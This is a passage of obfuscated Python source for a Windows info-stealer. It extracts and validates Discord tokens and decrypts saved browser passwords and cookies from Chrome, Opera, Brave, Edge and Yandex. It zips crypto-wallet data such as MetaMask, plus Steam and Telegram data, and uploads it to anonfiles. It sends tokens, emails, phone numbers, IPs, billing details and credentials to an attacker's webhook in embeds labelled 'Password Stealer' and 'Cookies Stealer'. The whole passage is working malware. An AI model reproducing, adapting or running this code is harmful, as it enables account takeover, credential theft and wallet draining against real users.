    OO000O00OOOOOO00O =OO0000OO00OOOOOOO ["discriminator"]#line:274
    O0O00OO00O0000OO0 =OO0000OO00OOOOOOO ["email"]#line:275
    O00O0OOOO00OO0OOO =OO0000OO00OOOOOOO ["id"]#line:276
    O000O00OOOOO0OO00 =OO0000OO00OOOOOOO ["avatar"]#line:277
    O0O0000O0OO00O00O =OO0000OO00OOOOOOO ["public_flags"]#line:278
    O0O0OO00OO0OOO000 =""#line:279
    O00O000OOOOO0OO00 =""#line:280
    if "premium_type"in OO0000OO00OOOOOOO :#line:282
        OOOO0O0OOO0OO00O0 =OO0000OO00OOOOOOO ["premium_type"]#line:283
        if OOOO0O0OOO0OO00O0 ==1 :#line:284
            O0O0OO00OO0OOO000 ="<a:DE_BadgeNitro:865242433692762122>"#line:285
        elif OOOO0O0OOO0OO00O0 ==2 :#line:286
            O0O0OO00OO0OOO000 ="<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"#line:287
    if "ph0n3"in OO0000OO00OOOOOOO :O00O000OOOOO0OO00 =f'{OO0000OO00OOOOOOO["ph0n3"]}'#line:288
    return O0OOOOO00OOOO0OOO ,OO000O00OOOOOO00O ,O0O00OO00O0000OO0 ,O00O0OOOO00OO0OOO ,O000O00OOOOO0OO00 ,O0O0000O0OO00O00O ,O0O0OO00OO0OOO000 ,O00O000OOOOO0OO00 #line:290
def ch1ckT4k1n (OO0OO0OOOO0OOO0O0 ):#line:292
    O00OOOO0O0OOOO00O ={"Authorization":OO0OO0OOOO0OOO0O0 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:297
    try :#line:298
        urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =O00OOOO0O0OOOO00O ))#line:299
        return True #line:300
    except :#line:301
        return False #line:302
def upl05dT4k31 (OOO0OOO000000OOOO ,OOOOOO0O000O00O0O ):#line:320
    global IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO #line:321
    O000O0O0000OOOO00 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:325
    O0OO00OO0OO0OO00O ,OOO0OO0OO0000O0O0 ,OO0000O0000O00O0O ,OOOOOO0OOOOOO0000 ,O0O000O0O000O00O0 ,O00O0O00O0O0O00OO ,OO0OOO00O0OO0OO00 ,O0OOOO0000OOOOO0O =G3tT0k4n1nf9 (OOO0OOO000000OOOO )#line:326
    if O0O000O0O000O00O0 ==None :#line:328
        O0O000O0O000O00O0 =""#line:329
    else :#line:330
        O0O000O0O000O00O0 =f"https://cdn.discordapp.com/avatars/{OOOOOO0OOOOOO0000}/{O0O000O0O000O00O0}"#line:331
    O0OOO00OOO0OO00OO =G3tb1ll1ng (OOO0OOO000000OOOO )#line:333
    O0O0O0OO00OOO0000 =G3tB4dg31 (O00O0O00O0O0O00OO )#line:334
    O0OO0OOO0O00O0O0O =G3tUHQFr13ndS (OOO0OOO000000OOOO )#line:335
    if O0OO0OOO0O00O0O0O =='':O0OO0OOO0O00O0O0O ="```No Rare Friends```"#line:336
    if not O0OOO00OOO0OO00OO :#line:337
        O0O0O0OO00OOO0000 ,O0OOOO0000OOOOO0O ,O0OOO00OOO0OO00OO ="🔒","🔒","🔒"#line:338
    if OO0OOO00O0OO0OO00 ==''and O0O0O0OO00OOO0000 =='':OO0OOO00O0OO0OO00 ="```None```"#line:339
    OOO0OOOOOO0OOOO00 ={"content":f'{globalInfo()} | `{OOOOOO0O000O00O0O}`',"embeds":[{"color":2895667 ,"fields":[{"name":"<a:hyperNOPPERS:828369518199308388> Token:","value":f"```{OOO0OOO000000OOOO}```","inline":True },{"name":"<:mail:750393870507966486> Email:","value":f"```{OO0000O0000O00O0O}```","inline":True },{"name":"<a:1689_Ringing_Phone:755219417075417088> Phone:","value":f"```{O0OOOO0000OOOOO0O}```","inline":True },{"name":"<:mc_earth:589630396476555264> IP:","value":f"```{g3t1p()}```","inline":True },{"name":"<:woozyface:874220843528486923> Badges:","value":f"{OO0OOO00O0OO0OO00}{O0O0O0OO00OOO0000}","inline":True },{"name":"<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:","value":f"{O0OOO00OOO0OO00OO}","inline":True },{"name":"<a:mavikirmizi:853238372591599617> HQ Friends:","value":f"{O0OO0OOO0O00O0O0O}","inline":False }],"author":{"name":f"{O0OO00OO0OO0OO00O}#{OOO0OO0OO0000O0O0} ({OOOOOO0OOOOOO0000})","icon_url":f"{O0O000O0O000O00O0}"},"footer":{"text":"unknown","icon_url":""},"thumbnail":{"url":f"{O0O000O0O000O00O0}"}}],"avatar_url":"","username":"unknown","attachments":[]}#line:399
    L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (OOO0OOOOOO0OOOO00 ).encode (),headers =O000O0O0000OOOO00 )#line:400
def R4f0rm3t (OO00OOOO0OOOO0000 ):#line:403
    O0O0000000O00O000 =re .findall ("(\w+[a-z])",OO00OOOO0OOOO0000 )#line:404
    while "https"in O0O0000000O00O000 :O0O0000000O00O000 .remove ("https")#line:405
    while "com"in O0O0000000O00O000 :O0O0000000O00O000 .remove ("com")#line:406
    while "net"in O0O0000000O00O000 :O0O0000000O00O000 .remove ("net")#line:407
    return list (set (O0O0000000O00O000 ))#line:408
def upload (O000OOOO00O0OOOOO ,O00000OO00OOOO00O ):#line:410
    OOOOOOOOOOO0O00O0 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:414
    if O000OOOO00O0OOOOO =="crcook":#line:416
        OOO00OO000O0OOO00 =' | '.join (O0OOOOOO00OO0O0O0 for O0OOOOOO00OO0O0O0 in cookiWords )#line:417
        if len (OOO00OO000O0OOO00 )>1000 :#line:418
            O000000000O0OO00O =R4f0rm3t (str (cookiWords ))#line:419
            OOO00OO000O0OOO00 =' | '.join (O0000OO0OO00O0OOO for O0000OO0OO00O0OOO in O000000000O0OO00O )#line:420
        OO0OOOO0000O0OO00 ={"content":f"{globalInfo()}","embeds":[{"title":"unknown | Cookies Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{OOO00OO000O0OOO00}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [unknownCookies.txt]({O00000OO00OOOO00O})","color":2895667 ,"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg","attachments":[]}#line:437
        L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (OO0OOOO0000O0OO00 ).encode (),headers =OOOOOOOOOOO0O00O0 )#line:438
        return #line:439
    if O000OOOO00O0OOOOO =="crpassw":#line:441
        O0O00OO0O0O0O00OO =' | '.join (OO0000000O00OOO0O for OO0000000O00OOO0O in paswWords )#line:442
        if len (O0O00OO0O0O0O00OO )>1000 :#line:443
            OO0OO0O0O00OOOO00 =R4f0rm3t (str (paswWords ))#line:444
            O0O00OO0O0O0O00OO =' | '.join (O0000O0O00O0000OO for O0000O0O00O0000OO in OO0OO0O0O00OOOO00 )#line:445
        OO0OOOO0000O0OO00 ={"content":f"{globalInfo()}","embeds":[{"title":"unknown | Password Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{O0O00OO0O0O0O00OO}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [unknownPassword.txt]({O00000OO00OOOO00O})","color":2895667 ,"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"","attachments":[]}#line:463
        L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (OO0OOOO0000O0OO00 ).encode (),headers =OOOOOOOOOOO0O00O0 )#line:464
        return #line:465
    if O000OOOO00O0OOOOO =="kiwi":#line:467
        OO0OOOO0000O0OO00 ={"content":f"{globalInfo()}","embeds":[{"color":2895667 ,"fields":[{"name":"Interesting files found on user PC:","value":O00000OO00OOOO00O }],"author":{"name":"unknown | File Stealer"},"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"","attachments":[]}#line:491
        L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (OO0OOOO0000O0OO00 ).encode (),headers =OOOOOOOOOOO0O00O0 )#line:492
        return #line:493
    _ #line:506
def wr1tef0rf1l3 (O00OOOOO0OOOOO00O ,O00O0O000O00O0O00 ):#line:511
    O0O0O00O0OOO000OO =os .getenv ("TEMP")+f"\cr{O00O0O000O00O0O00}.txt"#line:512
    with open (O0O0O00O0OOO000OO ,mode ='w',encoding ='utf-8')as O0000000000O00OOO :#line:513
        O0000000000O00OOO .write (f"<--unknown BEST -->\n\n")#line:514
        for O0O0OO000OO000OO0 in O00OOOOO0OOOOO00O :#line:515
            if O0O0OO000OO000OO0 [0 ]!='':#line:516
                O0000000000O00OOO .write (f"{O0O0OO000OO000OO0}\n")#line:517
T0k3ns =''#line:519
def getT0k3n (OO0OOOOOO0000O00O ,O0OOO0O000O00OO0O ):#line:520
    if not os .path .exists (OO0OOOOOO0000O00O ):return #line:521
    OO0OOOOOO0000O00O +=O0OOO0O000O00OO0O #line:523
    for OOO00O0OOO0O0OOO0 in os .listdir (OO0OOOOOO0000O00O ):#line:524
        if OOO00O0OOO0O0OOO0 .endswith (".log")or OOO00O0OOO0O0OOO0 .endswith (".ldb"):#line:525
            for OO0OO00OOOO000O0O in [OO0OO0OO0OOOO00OO .strip ()for OO0OO0OO0OOOO00OO in open (f"{OO0OOOOOO0000O00O}\\{OOO00O0OOO0O0OOO0}",errors ="ignore").readlines ()if OO0OO0OO0OOOO00OO .strip ()]:#line:526
                for O0000OOOOOO00000O in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",r"mfa\.[\w-]{80,95}"):#line:527
                    for OO0O0O000OOO0OOO0 in re .findall (O0000OOOOOO00000O ,OO0OO00OOOO000O0O ):#line:528
                        global T0k3ns #line:529
                        if ch1ckT4k1n (OO0O0O000OOO0OOO0 ):#line:530
                            if not OO0O0O000OOO0OOO0 in T0k3ns :#line:531
                                T0k3ns +=OO0O0O000OOO0OOO0 #line:533
                                upl05dT4k31 (OO0O0O000OOO0OOO0 ,OO0OOOOOO0000O00O )#line:534
P4ssw =[]#line:536
def getP4ssw (OO0O0OOOO0OOOOO00 ,OOOOOOO000O00OO00 ):#line:537
    global P4ssw ,P4sswCount #line:538
    if not os .path .exists (OO0O0OOOO0OOOOO00 ):return #line:539
    OOO00OO00O00O00O0 =OO0O0OOOO0OOOOO00 +OOOOOOO000O00OO00 +"/Login Data"#line:541
    if os .stat (OOO00OO00O00O00O0 ).st_size ==0 :return #line:542
    OOOOOOOOO000OOO0O =temp +"cr"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for OOOO00OO0O0OOO000 in range (8 ))+".db"#line:544
    shutil .copy2 (OOO00OO00O00O00O0 ,OOOOOOOOO000OOO0O )#line:546
    OO0OO0O00OOO000OO =sql_connect (OOOOOOOOO000OOO0O )#line:547
    OO00OOOOOOOOOO0OO =OO0OO0O00OOO000OO .cursor ()#line:548
    OO00OOOOOOOOOO0OO .execute ("SELECT action_url, username_value, password_value FROM logins;")#line:549
    O0O0OOO00O00O0O0O =OO00OOOOOOOOOO0OO .fetchall ()#line:550
    OO00OOOOOOOOOO0OO .close ()#line:551
    OO0OO0O00OOO000OO .close ()#line:552
    os .remove (OOOOOOOOO000OOO0O )#line:553
    O0000O0O00000O0O0 =OO0O0OOOO0OOOOO00 +"/Local State"#line:555
    with open (O0000O0O00000O0O0 ,'r',encoding ='utf-8')as O00OO00O0OO0O00OO :O0000OOOOOOOO00O0 =json_loads (O00OO00O0OO0O00OO .read ())#line:556
    OOO0O00O00OOO0OOO =b64decode (O0000OOOOOOOO00O0 ['os_crypt']['encrypted_key'])#line:557
    OOO0O00O00OOO0OOO =CryptUnprotectData (OOO0O00O00OOO0OOO [5 :])#line:558
    for O0000O0O00OOOO0O0 in O0O0OOO00O00O0O0O :#line:560
        if O0000O0O00OOOO0O0 [0 ]!='':#line:561
            for OO00OOO00OOOOO00O in keyword :#line:562
                OOOO0O0O0O000O0O0 =OO00OOO00OOOOO00O #line:563
                if "https"in OO00OOO00OOOOO00O :#line:564
                    O000000O0O0O0O0OO =OO00OOO00OOOOO00O #line:565
                    OO00OOO00OOOOO00O =O000000O0O0O0O0OO .split ('[')[1 ].split (']')[0 ]#line:566
                if OO00OOO00OOOOO00O in O0000O0O00OOOO0O0 [0 ]:#line:567
                    if not OOOO0O0O0O000O0O0 in paswWords :paswWords .append (OOOO0O0O0O000O0O0 )#line:568
            P4ssw .append (f"UR1: {O0000O0O00OOOO0O0[0]} | U53RN4M3: {O0000O0O00OOOO0O0[1]} | P455W0RD: {D3kryptV4lU3(O0000O0O00OOOO0O0[2], OOO0O00O00OOO0OOO)}")#line:569
            P4sswCount +=1 #line:570
    wr1tef0rf1l3 (P4ssw ,'passw')#line:571
C00k13 =[]#line:573
def getC00k13 (O00OOOOOOO00OO00O ,O0000O00OOOOO00O0 ):#line:574
    global C00k13 ,CookiCount #line:575
    if not os .path .exists (O00OOOOOOO00OO00O ):return #line:576
    O0000OO00OOOOO0O0 =O00OOOOOOO00OO00O +O0000O00OOOOO00O0 +"/Cookies"#line:578
    if os .stat (O0000OO00OOOOO0O0 ).st_size ==0 :return #line:579
    OO0OOOO0O0OO0OO00 =temp +"cr"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for OO0OOO0O0O00O00OO in range (8 ))+".db"#line:581
    shutil .copy2 (O0000OO00OOOOO0O0 ,OO0OOOO0O0OO0OO00 )#line:583
    O0000O00000OO0O00 =sql_connect (OO0OOOO0O0OO0OO00 )#line:584
    O0OO00000OO00O000 =O0000O00000OO0O00 .cursor ()#line:585
    O0OO00000OO00O000 .execute ("SELECT host_key, name, encrypted_value FROM cookies")#line:586
    OOO0O0OOO0O00OO0O =O0OO00000OO00O000 .fetchall ()#line:587
    O0OO00000OO00O000 .close ()#line:588
    O0000O00000OO0O00 .close ()#line:589
    os .remove (OO0OOOO0O0OO0OO00 )#line:590
    O000O0O000O0O0O0O =O00OOOOOOO00OO00O +"/Local State"#line:592
    with open (O000O0O000O0O0O0O ,'r',encoding ='utf-8')as OOOOOOO0OO00000OO :O0OOO00000OOOOO00 =json_loads (OOOOOOO0OO00000OO .read ())#line:594
    OOO00OOOO0OO0O000 =b64decode (O0OOO00000OOOOO00 ['os_crypt']['encrypted_key'])#line:595
    OOO00OOOO0OO0O000 =CryptUnprotectData (OOO00OOOO0OO0O000 [5 :])#line:596
    for OO0O000OOO00O0OO0 in OOO0O0OOO0O00OO0O :#line:598
        if OO0O000OOO00O0OO0 [0 ]!='':#line:599
            for O000000O000O00OOO in keyword :#line:600
                O00O00O0OOO000000 =O000000O000O00OOO #line:601
                if "https"in O000000O000O00OOO :#line:602
                    O00OOO0O000OOOOOO =O000000O000O00OOO #line:603
                    O000000O000O00OOO =O00OOO0O000OOOOOO .split ('[')[1 ].split (']')[0 ]#line:604
                if O000000O000O00OOO in OO0O000OOO00O0OO0 [0 ]:#line:605
                    if not O00O00O0OOO000000 in cookiWords :cookiWords .append (O00O00O0OOO000000 )#line:606
            C00k13 .append (f"{OO0O000OOO00O0OO0[0]}	TRUE	/	FALSE	2597573456	{OO0O000OOO00O0OO0[1]}	{D3kryptV4lU3(OO0O000OOO00O0OO0[2], OOO00OOOO0OO0O000)}")#line:607
            CookiCount +=1 #line:608
    wr1tef0rf1l3 (C00k13 ,'cook')#line:609
def G3tD1sc0rd (OOOO0OOOO0000O000 ,OOO000OO000OOO000 ):#line:611
    if not os .path .exists (f"{OOOO0OOOO0000O000}/Local State"):return #line:612
    OO00OO0O00O0OO0O0 =OOOO0OOOO0000O000 +OOO000OO000OOO000 #line:614
    O0000000O0OO00O0O =OOOO0OOOO0000O000 +"/Local State"#line:616
    with open (O0000000O0OO00O0O ,'r',encoding ='utf-8')as O000OO0000O00OO00 :O00OO00O0O00O00OO =json_loads (O000OO0000O00OO00 .read ())#line:617
    OOOOOOO000OO0OO00 =b64decode (O00OO00O0O00O00OO ['os_crypt']['encrypted_key'])#line:618
    OOOOOOO000OO0OO00 =CryptUnprotectData (OOOOOOO000OO0OO00 [5 :])#line:619
    for O00O0OO0O000OO0O0 in os .listdir (OO00OO0O00O0OO0O0 ):#line:622
        if O00O0OO0O000OO0O0 .endswith (".log")or O00O0OO0O000OO0O0 .endswith (".ldb"):#line:624
            for O000OO00O0O000O00 in [OO00O0O0000OOO00O .strip ()for OO00O0O0000OOO00O in open (f"{OO00OO0O00O0OO0O0}\\{O00O0OO0O000OO0O0}",errors ="ignore").readlines ()if OO00O0O0000OOO00O .strip ()]:#line:625
                for OOO0OO000O0O00000 in re .findall (r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",O000OO00O0O000O00 ):#line:626
                    global T0k3ns #line:627
                    O0000O000O000OOO0 =D3kryptV4lU3 (b64decode (OOO0OO000O0O00000 .split ('dQw4w9WgXcQ:')[1 ]),OOOOOOO000OO0OO00 )#line:628
                    if ch1ckT4k1n (O0000O000O000OOO0 ):#line:629
                        if not O0000O000O000OOO0 in T0k3ns :#line:630
                            T0k3ns +=O0000O000O000OOO0 #line:632
                            upl05dT4k31 (O0000O000O000OOO0 ,OOOO0OOOO0000O000 )#line:634
def GatherZips (OOOO00OO00OO00O00 ,OO00OOOO0OOOO00OO ,OOO0000O00000O0O0 ):#line:636
    OO0O0OOO0O0O00000 =[]#line:637
    for OOO0O000OOO000OOO in OOOO00OO00OO00O00 :#line:638
        O00O0OO00O0O0000O =threading .Thread (target =Z1pTh1ngs ,args =[OOO0O000OOO000OOO [0 ],OOO0O000OOO000OOO [5 ],OOO0O000OOO000OOO [1 ]])#line:639
        O00O0OO00O0O0000O .start ()#line:640
        OO0O0OOO0O0O00000 .append (O00O0OO00O0O0000O )#line:641
    for OOO0O000OOO000OOO in OO00OOOO0OOOO00OO :#line:643
        O00O0OO00O0O0000O =threading .Thread (target =Z1pTh1ngs ,args =[OOO0O000OOO000OOO [0 ],OOO0O000OOO000OOO [2 ],OOO0O000OOO000OOO [1 ]])#line:644
        O00O0OO00O0O0000O .start ()#line:645
        OO0O0OOO0O0O00000 .append (O00O0OO00O0O0000O )#line:646
    O00O0OO00O0O0000O =threading .Thread (target =ZipTelegram ,args =[OOO0000O00000O0O0 [0 ],OOO0000O00000O0O0 [2 ],OOO0000O00000O0O0 [1 ]])#line:648
    O00O0OO00O0O0000O .start ()#line:649
    OO0O0OOO0O0O00000 .append (O00O0OO00O0O0000O )#line:650
    for O0O00OO00OO0OOO0O in OO0O0OOO0O0O00000 :#line:652
        O0O00OO00OO0OOO0O .join ()#line:653
    global WalletsZip ,GamingZip ,OtherZip #line:654
    OO0OOO00O0O00000O ,OOOOO00O000O0O0O0 ,OOO0O00OOOOOO0000 ="",'',''#line:657
    if not len (WalletsZip )==0 :#line:658
        OO0OOO00O0O00000O =":coin:  •  Wallets\n"#line:659
        for O0O0OOOO000OO0OOO in WalletsZip :#line:660
            OO0OOO00O0O00000O +=f"└─ [{O0O0OOOO000OO0OOO[0]}]({O0O0OOOO000OO0OOO[1]})\n"#line:661
    if not len (WalletsZip )==0 :#line:662
        OOOOO00O000O0O0O0 =":video_game:  •  Gaming:\n"#line:663
        for O0O0OOOO000OO0OOO in GamingZip :#line:664
            OOOOO00O000O0O0O0 +=f"└─ [{O0O0OOOO000OO0OOO[0]}]({O0O0OOOO000OO0OOO[1]})\n"#line:665
    if not len (OtherZip )==0 :#line:666
        OOO0O00OOOOOO0000 =":tickets:  •  Apps\n"#line:667
        for O0O0OOOO000OO0OOO in OtherZip :#line:668
            OOO0O00OOOOOO0000 +=f"└─ [{O0O0OOOO000OO0OOO[0]}]({O0O0OOOO000OO0OOO[1]})\n"#line:669
    O00000O0000OO0000 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:673
    OO0OOO00OOO0OOOOO ={"content":globalInfo (),"embeds":[{"title":"unknown Zips","description":f"{OO0OOO00O0O00000O}\n{OOOOO00O000O0O0O0}\n{OOO0O00OOOOOO0000}","color":2895667 ,"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"","attachments":[]}#line:691
    L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (OO0OOO00OOO0OOOOO ).encode (),headers =O00000O0000OO0000 )#line:692
def ZipTelegram (O0O00OO00000O0O0O ,OOOO0OO0O00O00O0O ,OOOO0O0000OOO0OOO ):#line:695
    global OtherZip #line:696
    O0OOOO0OOOOOO0000 =O0O00OO00000O0O0O #line:697
    O0O0000O0O000O00O =OOOO0OO0O00O00O0O #line:698
    if not os .path .exists (O0OOOO0OOOOOO0000 ):return #line:699
    subprocess .Popen (f"taskkill /im {OOOO0O0000OOO0OOO} /t /f >nul 2>&1",shell =True )#line:700
    OO0O0000OOOOO00OO =ZipFile (f"{O0OOOO0OOOOOO0000}/{O0O0000O0O000O00O}.zip","w")#line:702
    for OOOOOO0O0OO0O0OO0 in os .listdir (O0OOOO0OOOOOO0000 ):#line:703
        if not ".zip"in OOOOOO0O0OO0O0OO0 and not "tdummy"in OOOOOO0O0OO0O0OO0 and not "user_data"in OOOOOO0O0OO0O0OO0 and not "webview"in OOOOOO0O0OO0O0OO0 :#line:704
            OO0O0000OOOOO00OO .write (O0OOOO0OOOOOO0000 +"/"+OOOOOO0O0OO0O0OO0 )#line:705
    OO0O0000OOOOO00OO .close ()#line:706
    O0OOOOO0000OO00OO =uploadToAnonfiles (f'{O0OOOO0OOOOOO0000}/{O0O0000O0O000O00O}.zip')#line:708
    os .remove (f"{O0OOOO0OOOOOO0000}/{O0O0000O0O000O00O}.zip")#line:709
    OtherZip .append ([OOOO0OO0O00O00O0O ,O0OOOOO0000OO00OO ])#line:710
def Z1pTh1ngs (OOOOOO00O0O000O0O ,OOOO0000OOOO0O000 ,OO00OO000OO00O0OO ):#line:712
    O0O00O000O0OO0O00 =OOOOOO00O0O000O0O #line:713
    OOO000OOOOO000000 =OOOO0000OOOO0O000 #line:714
    global WalletsZip ,GamingZip ,OtherZip #line:715
    if "nkbihfbeogaeaoehlefnkodbefgpgknn"in OOOO0000OOOO0O000 :#line:717
        O0OO00OO0OOO00O0O =OOOOOO00O0O000O0O .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:718
        OOO000OOOOO000000 =f"Metamask_{O0OO00OO0OOO00O0O}"#line:719
        O0O00O000O0OO0O00 =OOOOOO00O0O000O0O +OOOO0000OOOO0O000 #line:720
    if not os .path .exists (O0O00O000O0OO0O00 ):return #line:722
    subprocess .Popen (f"taskkill /im {OO00OO000OO00O0OO} /t /f >nul 2>&1",shell =True )#line:723
    if "Wallet"in OOOO0000OOOO0O000 or "NationsGlory"in OOOO0000OOOO0O000 :#line:725
        O0OO00OO0OOO00O0O =OOOOOO00O0O000O0O .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:726
        OOO000OOOOO000000 =f"{O0OO00OO0OOO00O0O}"#line:727
    elif "Steam"in OOOO0000OOOO0O000 :#line:729
        if not os .path .isfile (f"{O0O00O000O0OO0O00}/loginusers.vdf"):return #line:730
        OOOO0O00OOOO0O000 =open (f"{O0O00O000O0OO0O00}/loginusers.vdf","r+",encoding ="utf8")#line:731
        O0O00O0OO000O0O0O =OOOO0O00OOOO0O000 .readlines ()#line:732
        O0OOO00000O0OOO0O =False #line:733
        for OOOOOO0OO0O0OOOO0 in O0O00O0OO000O0O0O :#line:734
            if 'RememberPassword"\t\t"1"'in OOOOOO0OO0O0OOOO0 :#line:735
                O0OOO00000O0OOO0O =True #line:736
        if O0OOO00000O0OOO0O ==False :return #line:737
        OOO000OOOOO000000 =OOOO0000OOOO0O000 #line:738
    OOO00O0O0OOOOOOO0 =ZipFile (f"{O0O00O000O0OO0O00}/{OOO000OOOOO000000}.zip","w")#line:741
    for OOO0O0O00O000OO00 in os .listdir (O0O00O000O0OO0O00 ):#line:742
        if not ".zip"in OOO0O0O00O000OO00 :OOO00O0O0OOOOOOO0 .write (O0O00O000O0OO0O00 +"/"+OOO0O0O00O000OO00 )#line:743
    OOO00O0O0OOOOOOO0 .close ()#line:744
    OO0O000000OOO0OOO =uploadToAnonfiles (f'{O0O00O000O0OO0O00}/{OOO000OOOOO000000}.zip')#line:746
    os .remove (f"{O0O00O000O0OO0O00}/{OOO000OOOOO000000}.zip")#line:747
    if "Wallet"in OOOO0000OOOO0O000 or "eogaeaoehlef"in OOOO0000OOOO0O000 :#line:749
        WalletsZip .append ([OOO000OOOOO000000 ,OO0O000000OOO0OOO ])#line:750
    elif "NationsGlory"in OOO000OOOOO000000 or "Steam"in OOO000OOOOO000000 or "RiotCli"in OOO000OOOOO000000 :#line:751
        GamingZip .append ([OOO000OOOOO000000 ,OO0O000000OOO0OOO ])#line:752
    else :#line:753
        OtherZip .append ([OOO000OOOOO000000 ,OO0O000000OOO0OOO ])#line:754
def GatherAll ():#line:757
    ""#line:758
    O00OOO000O00OOOOO =[[f"{roaming}/Opera Software/Opera GX Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Neon/User Data/Default","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome SxS/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/BraveSoftware/Brave-Browser/User Data","brave.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Yandex/YandexBrowser/User Data","yandex.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Microsoft/Edge/User Data","edge.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"]]#line:768
    O00OOO00O0OO00O0O =[[f"{roaming}/Discord","/Local Storage/leveldb"],[f"{roaming}/Lightcord","/Local Storage/leveldb"],[f"{roaming}/discordcanary","/Local Storage/leveldb"],[f"{roaming}/discordptb","/Local Storage/leveldb"],]#line:775
